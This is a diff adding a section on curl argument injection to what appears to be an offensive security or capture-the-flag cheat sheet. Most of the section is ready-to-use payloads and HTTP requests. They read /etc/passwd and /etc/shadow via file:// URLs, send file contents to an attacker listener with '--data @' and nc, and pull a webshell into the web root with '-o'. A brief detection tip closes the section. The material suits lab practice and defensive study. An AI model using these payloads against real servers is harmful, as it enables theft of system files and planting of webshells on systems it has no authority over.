@@ -72,6 +72,80 @@ file:///var/www/html/config.php
 
 ---
 
+## Curl Argument Injection (Multiple URL Abuse)
+
+When the backend uses curl and passes user input directly, curl's multiple URL feature can be abused.
+
+### LFI via Multiple URLs
+
+Curl processes multiple space-separated URLs. If input isn't properly sanitized:
+
+```bash
+# Backend code: curl -s $user_input
+# Payload - add a second URL with file:// protocol
+http://127.0.0.1 file:///etc/passwd
+```
+
+**Example exploitation:**
+
+```http
+POST /index.php HTTP/1.1
+Host: target.htb
+Content-Type: application/x-www-form-urlencoded
+
+url=http://127.0.0.1 file:///etc/passwd
+```
+
+This works because curl treats `http://127.0.0.1` and `file:///etc/passwd` as two separate requests.
+
+### File Exfiltration via --data @
+
+Abuse curl's `--data @filename` option to POST file contents to attacker:
+
+```bash
+# Payload
+http://ATTACKER_IP --data @/etc/passwd
+
+# Start listener
+nc -nlvp 80
+```
+
+**Example:**
+
+```http
+POST /index.php HTTP/1.1
+Host: target.htb
+Content-Type: application/x-www-form-urlencoded
+
+url=http://10.10.14.145 --data @/etc/passwd
+```
+
+The target server will POST the contents of `/etc/passwd` to your listener.
+
+### Other Useful Curl Arguments
+
+```bash
+# Write output to file (webshell upload)
+http://ATTACKER_IP/shell.php -o /var/www/html/shell.php
+
+# Read file to stdout
+file:///etc/shadow
+
+# Combine techniques
+http://127.0.0.1 --data @/var/www/html/index.php
+```
+
+### Detection
+
+Look for User-Agent in requests:
+```
+User-Agent: curl/7.81.0
+```
+
+This indicates curl is making backend requests and may be vulnerable to argument injection.
+
+---
+
 ## Gopher Protocol (Send POST Requests)
 
 Use gopher to send arbitrary HTTP requests (e.g., POST with body).
